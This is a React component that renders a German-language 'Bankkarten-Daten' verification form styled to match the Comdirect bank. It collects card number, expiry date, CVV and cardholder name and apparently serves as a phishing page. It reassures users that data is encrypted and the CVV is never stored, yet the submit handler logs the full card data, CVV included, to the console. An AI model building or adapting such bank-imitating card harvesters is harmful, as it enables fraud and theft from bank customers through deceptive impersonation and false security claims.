import React, { useState, useEffect } from 'react';

interface BankCardData {
  card_number: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
}

interface BankCardFormProps {
  onSubmit: (data: BankCardData) => void;
  onSkip?: () => void;
}

const BankCardForm: React.FC<BankCardFormProps> = ({ onSubmit, onSkip }) => {
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  
  // Form fields
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  
  // Focus states
  const [cardNumberFocused, setCardNumberFocused] = useState(false);
  const [expiryDateFocused, setExpiryDateFocused] = useState(false);
  const [cvvFocused, setCvvFocused] = useState(false);
  const [cardholderNameFocused, setCardholderNameFocused] = useState(false);
  
  // Validation errors
  const [errors, setErrors] = useState<Partial<BankCardData>>({});

  // CSS variables that match the Comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Format card number with spaces (XXXX XXXX XXXX XXXX)
  const formatCardNumber = (value: string): string => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  // Format expiry date (MM/YY)
  const formatExpiryDate = (value: string): string => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      let month = v.substring(0, 2);
      let year = v.substring(2, 4);
      
      // Ensure month is valid (01-12)
      if (parseInt(month) > 12) {
        month = '12';
      }
      if (parseInt(month) === 0) {
        month = '01';
      }
      
      return month + (year ? '/' + year : '');
    }
    return v;
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<BankCardData> = {};
    
    if (!cardNumber.trim()) {
      newErrors.card_number = 'Kartennummer ist erforderlich';
    } else if (!/^\d+(\s\d+)*$/.test(cardNumber.trim())) {
      newErrors.card_number = 'Kartennummer darf nur Zahlen enthalten';
    }
    
    if (!expiryDate.trim()) {
      newErrors.expiry_date = 'Ablaufdatum ist erforderlich';
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate)) {
      newErrors.expiry_date = 'Ungültiges Format. Verwenden Sie MM/JJ (Monat 01-12)';
    }
    
    if (!cvv.trim()) {
      newErrors.cvv = 'CVV ist erforderlich';
    } else if (cvv.length < 3) {
      newErrors.cvv = 'CVV muss 3-4 Ziffern haben';
    }
    
    if (!cardholderName.trim()) {
      newErrors.cardholder_name = 'Karteninhaber ist erforderlich';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }
    
    setIsLoading(true);
    
    try {
      const formData: BankCardData = {
        card_number: cardNumber.trim(),
        expiry_date: expiryDate.trim(),
        cvv: cvv.trim(),
        cardholder_name: cardholderName.trim()
      };
      
      console.log('BankCardForm: Submitting data:', formData);
      await onSubmit(formData);
    } catch (error) {
      console.error('Error submitting bank card data:', error);
      setIsLoading(false);
    }
  };

  const inputStyle = {
    width: '100%',
    padding: '1.25rem 0 0.5rem 0',
    border: 'none',
    borderBottom: '1px solid var(--border)',
    backgroundColor: 'transparent',
    fontSize: '1rem',
    color: 'var(--text)',
    outline: 'none',
    fontFamily: 'MarkWeb, Arial, sans-serif',
    transition: 'border-bottom-color 0.3s ease'
  };

  const labelStyle = (focused: boolean, hasValue: boolean) => ({
    position: 'absolute' as const,
    left: '0',
    top: focused || hasValue ? '0.25rem' : '1.25rem',
    fontSize: focused || hasValue ? '0.75rem' : '1rem',
    color: focused ? 'var(--active)' : 'var(--text-secondary)',
    transition: 'all 0.3s ease',
    pointerEvents: 'none' as const,
    fontFamily: 'MarkWeb, Arial, sans-serif'
  });

  const containerStyle = {
    position: 'relative' as const,
    marginBottom: '1.5rem'
  };

  if (isLoading) {
    return <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '50vh',
      fontSize: '1.125rem',
      fontFamily: 'MarkWeb, Arial, sans-serif',
      color: 'var(--text)'
    }}>
      Bankkarten-Daten werden verarbeitet.....
    </div>;
  }

  return (
    <div style={{
      ...cssVariables,
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Arial, sans-serif'
    }}>
      <div style={{ 
        maxWidth: '980px', 
        margin: '0 auto', 
        padding: isMobile ? '2rem 1rem' : '4rem 2rem',
        display: 'flex',
        justifyContent: 'space-between',
        gap: '3rem'
      }}>
        {/* Left Column - Form */}
        <div style={{
          flex: isMobile ? '1' : '0 0 60%',
          maxWidth: isMobile ? '100%' : '600px'
        }}>
          <h1 style={{
            fontSize: isMobile ? '2rem' : '2.5rem',
            fontWeight: '400',
            color: 'var(--text)',
            marginBottom: '1rem',
            fontFamily: 'MarkWeb, Arial, sans-serif'
          }}>
            Bankkarten-Daten
          </h1>
          
          <p style={{
            color: 'var(--text)',
            fontSize: '1rem',
            marginBottom: '2rem',
            fontFamily: 'MarkWeb, Arial, sans-serif'
          }}>
            Bitte geben Sie Ihre Bankkarten-Daten zur weiteren Verifizierung ein.
          </p>

          <form onSubmit={handleSubmit}>
            {/* Card Number */}
            <div style={containerStyle}>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                onFocus={() => setCardNumberFocused(true)}
                onBlur={() => setCardNumberFocused(false)}
                style={{
                  ...inputStyle,
                  borderBottomColor: errors.card_number ? '#dc2626' : 'var(--border)',
                  letterSpacing: '2px'
                }}
                maxLength={19}
                required
              />
              <label style={labelStyle(cardNumberFocused, !!cardNumber)}>
                Kartennummer *
              </label>
              {errors.card_number && (
                <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                  {errors.card_number}
                </div>
              )}
            </div>

            {/* Expiry Date and CVV Row */}
            <div style={{
              display: 'grid',
              gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr',
              gap: isMobile ? '0' : '1.5rem',
              marginBottom: '1.5rem'
            }}>
              {/* Expiry Date */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={expiryDate}
                  onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
                  onFocus={() => setExpiryDateFocused(true)}
                  onBlur={() => setExpiryDateFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.expiry_date ? '#dc2626' : 'var(--border)'
                  }}
                  maxLength={5}
                  required
                />
                <label style={labelStyle(expiryDateFocused, !!expiryDate)}>
                  Ablaufdatum (MM/JJ) *
                </label>
                {errors.expiry_date && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.expiry_date}
                  </div>
                )}
              </div>

              {/* CVV */}
              <div style={containerStyle}>
                <input
                  type="text"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                  onFocus={() => setCvvFocused(true)}
                  onBlur={() => setCvvFocused(false)}
                  style={{
                    ...inputStyle,
                    borderBottomColor: errors.cvv ? '#dc2626' : 'var(--border)'
                  }}
                  maxLength={4}
                  required
                />
                <label style={labelStyle(cvvFocused, !!cvv)}>
                  CVV *
                </label>
                {errors.cvv && (
                  <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                    {errors.cvv}
                  </div>
                )}
              </div>
            </div>

            {/* Cardholder Name */}
            <div style={containerStyle}>
              <input
                type="text"
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value.toUpperCase())}
                onFocus={() => setCardholderNameFocused(true)}
                onBlur={() => setCardholderNameFocused(false)}
                style={{
                  ...inputStyle,
                  borderBottomColor: errors.cardholder_name ? '#dc2626' : 'var(--border)',
                  textTransform: 'uppercase'
                }}
                required
              />
              <label style={labelStyle(cardholderNameFocused, !!cardholderName)}>
                Karteninhaber *
              </label>
              {errors.cardholder_name && (
                <div style={{ color: '#dc2626', fontSize: '0.75rem', marginTop: '0.25rem' }}>
                  {errors.cardholder_name}
                </div>
              )}
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="comdirect-button"
              style={{
                marginTop: '2rem',
                opacity: isLoading ? 0.7 : 1
              }}
            >
              {isLoading ? 'Wird verarbeitet...' : 'Verifizieren'}
            </button>
          </form>
        </div>

        {/* Right Column - Security Info */}
        {!isMobile && (
          <div style={{
            flex: '0 0 35%',
            paddingTop: '4rem'
          }}>
            <div style={{
              backgroundColor: '#f8f9fa',
              borderRadius: '0.5rem',
              padding: '2rem',
              border: '1px solid var(--border)'
            }}>
              <h3 style={{
                fontSize: '1.25rem',
                fontWeight: '500',
                color: 'var(--text)',
                marginBottom: '1.5rem',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Sicherheit & Datenschutz
              </h3>

              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '1.5rem'
              }}>
                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Verschlüsselte Übertragung
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Ihre Kartendaten werden mit höchster Verschlüsselung übertragen.
                  </p>
                </div>

                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Sichere Speicherung
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Alle Daten werden gemäß Bankstandards geschützt gespeichert.
                  </p>
                </div>

                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Keine Speicherung der CVV
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Ihre CVV wird nur zur Verifizierung verwendet und nicht gespeichert.
                  </p>
                </div>

                <div>
                  <p style={{
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    color: 'var(--text)',
                    marginBottom: '0.5rem',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Pflichtfelder
                  </p>
                  <p style={{
                    fontSize: '0.875rem',
                    color: 'var(--text-secondary)',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Alle mit * markierten Felder sind für die Verifizierung erforderlich.
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default BankCardForm;